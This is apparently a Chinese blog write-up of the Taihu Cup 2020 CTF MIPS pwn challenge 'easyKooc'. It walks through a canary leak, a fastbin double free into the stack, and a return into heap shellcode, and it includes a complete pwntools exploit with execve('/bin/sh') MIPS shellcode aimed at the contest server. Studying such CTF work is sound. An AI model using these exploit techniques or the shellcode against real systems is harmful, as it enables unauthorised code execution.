---
layout:     post
title:      太湖杯2020 easyKooc wp
subtitle:   记太湖杯2020的一道mips题
date:       2020-11-08
author:     X1ng
header-img: 太湖杯2020.jpg
catalog: true
tags:
    - 比赛
    - wp

---

看到物联网ctf，还以为会是各种裸机程序、RTOS的题目，，然而pwn好像也都是堆题or2，然而我太菜了只出了一题mips签到

菜鸡落泪

例行检查

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkhs0r2ec6j313808macq.jpg)

开启了 和canary保护，mips下不支持NX保护，所以这里的NX开不开都是一样的

用ghidra打开查看反汇编代码

![](https://tva1.sinaimg.cn/large/0081Kckwly1gky9ijt2ryj30u015o7a4.jpg)

一开始会送一个gift，就是栈的地址

可以直接看到第三个分支是向栈上写入一些内容，然后把输入的内容用printf输出一遍，动调发现有栈溢出

add函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkhs2thtscj30w80oc763.jpg)

只能申请0x38大小的chunk，在分配chunk前并不会清空chunk中的信息，然后会用write函数输出一遍chunk中的内容

delete函数

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkhs3011nrj30vo0hc0tm.jpg)

delete存在uaf漏洞

看到这里思路就是通过栈溢出覆盖canary低位的`\x00`来泄露canary，然后在栈上构造`0x00000041`让栈满足fastbin的分配条件，由于栈的地址已经给出，double free将chunk分配到栈上，就可以实现rop

突然发现mips上的rop跟x86下的不太一样，用来找rop的ida脚本装不好，mips指令也没有搞得很明白（菜鸡再次落泪），所以最后还是决定用申请fastbin时候只输入`\n`，利用chunk上残留的fd泄露堆地址，然后把shellcode写在堆地址中，覆盖返回地址为堆地址

但是pwntools里`shellcraft.mips.sh()`生成的shellcode太长，然后面向互联网编写exp，在[ctf-wiki](https://ctf-wiki.github.io/ctf-wiki//pwn/linux/mips/mips_rop-zh/)上找了一段0x30长度的shellcode

```python
shellcode  = b""

shellcode += b"\xff\xff\x06\x28"  # slti $a2, $zero, -1

shellcode += b"\x62\x69\x0f\x3c"  # lui $t7, 0x6962

shellcode += b"\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f

shellcode += b"\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)

shellcode += b"\x73\x68\x0e\x3c"  # lui $t6, 0x6873

shellcode += b"\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e

shellcode += b"\xf8\xff\xae\xaf"  # sw $t6, -8($sp)

shellcode += b"\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)

shellcode += b"\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc

shellcode += b"\xff\xff\x05\x28"  # slti $a1, $zero, -1

shellcode += b"\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab

shellcode += b"\x0c\x01\x01\x01"  # syscall 0x40404
```

后面又发现一些小问题，本地io和远程io又有点不一样导致远程没办法接收堆地址，然后发现每次泄露传回来的地址都一样，但是发现alsr直接是关闭的，连堆地址都是固定的了

![](https://tva1.sinaimg.cn/large/0081Kckwly1gkhsmd535uj30o6086jsx.jpg)

所以直接将shellcode传入第一个chunk，返回地址覆盖成`0x413008`，把canary修复后正常退出即可getshell

exp:

```python
from pwn import*
import sys

context.binary = "easyKooc"
context.arch='mips'
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("121.36.166.138", 8890)# 
elif sys.argv[1] == "l":
    p = process(["qemu-mipsel-static", "-L", "./mipsel-linux-gnu", "./easyKooc"])
else:
    p = process(["qemu-mipsel-static", "-g", "1237", "-L", "./mipsel-linux-gnu", "./easyKooc"])


ru=lambda x:p.recvuntil(x)
rc=lambda x:p.recv(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda : p.interactive()

def add(idx,con):
	ru('your choice')
	sl('1')
	ru('todo id!')
	sl(str(idx))
	ru('content')
	sl(con)

def delete(idx):
	ru('your choice')
	sl('2')
	ru('todo id!')
	sl(str(idx))

def show(idx):
	ru('>>')
	sl('4')
	ru('show:')
	sl(str(idx))

def edit(idx,con):
	ru('your choice')
	sl('3')
	ru('leave?')
	sl(str(idx))
	ru('info:')
	sl(con)

shellcode = "\xff\xff\x06\x28"  # slti $a2, $zero, -1

shellcode += "\x62\x69\x0f\x3c"  # lui $t7, 0x6962

shellcode += "\x2f\x2f\xef\x35"  # ori $t7, $t7, 0x2f2f

shellcode += "\xf4\xff\xaf\xaf"  # sw $t7, -0xc($sp)

shellcode += "\x73\x68\x0e\x3c"  # lui $t6, 0x6873

shellcode += "\x6e\x2f\xce\x35"  # ori $t6, $t6, 0x2f6e

shellcode += "\xf8\xff\xae\xaf"  # sw $t6, -8($sp)

shellcode += "\xfc\xff\xa0\xaf"  # sw $zero, -4($sp)

shellcode += "\xf4\xff\xa4\x27"  # addiu $a0, $sp, -0xc

shellcode += "\xff\xff\x05\x28"  # slti $a1, $zero, -1

shellcode += "\xab\x0f\x02\x24"  # addiu;$v0, $zero, 0xfab

shellcode += "\x0c\x01\x01\x01"	 # syscall 0x40404


ru('motto!')
sl(shellcode)
ru('gift for you: 0x')
stack = int(p.recv(8),16)
print hex(stack)

ru('your choice')
sl('3')
ru('to leave?')
sl('a'*0x20)
ru('The message for you is ')
rc(0x21)
canary = u32(rc(3).rjust(4,'\x00'))
print hex(canary)

add(1,'a')
add(2,'b')
add(3,'c')
#add(4,'d')
delete(1)
delete(2)
delete(1)

ru('your choice')
sl('3')
ru('to leave?')
sd('a'*0x1c+p32(0)+p32(0x41))

add(4,p32(stack+0x24))
add(5,'')
#p.recvline()
#heap = u32(rc(0x3a)[0x12:0x15].rjust(4,'\x08'))
#print hex(heap) #失败的io
add(6,'')

ru('your choice')
sl('1')
ru('todo id!')
sl('7')
ru('content')
#sd('A'*4+'B'*4+'C'*4+'D'*4+'E'*4+'F'*4+'G'*4+'H'*4+'I'*4+'J'*4+'K'*4+'L'*4+'M'*4+'N'*4)
#sd('A'*4+p32(heap)+'C'*4+'D'*4+'E'*4+'F'*4+'G'*4+'H'*4+'I'*4+'J'*4+'K'*4+'L'*4+'M'*4+'N'*4)
sd('A'*4+p32(0x413008)+'C'*4+'D'*4+'E'*4+'F'*4+'G'*4+'H'*4+'I'*4+'J'*4+'K'*4+'L'*4+'M'*4+'N'*4)
ru('your choice')
sl('3')
ru('to leave?')
sd('b'*0x20+p32(canary))


ia()
```

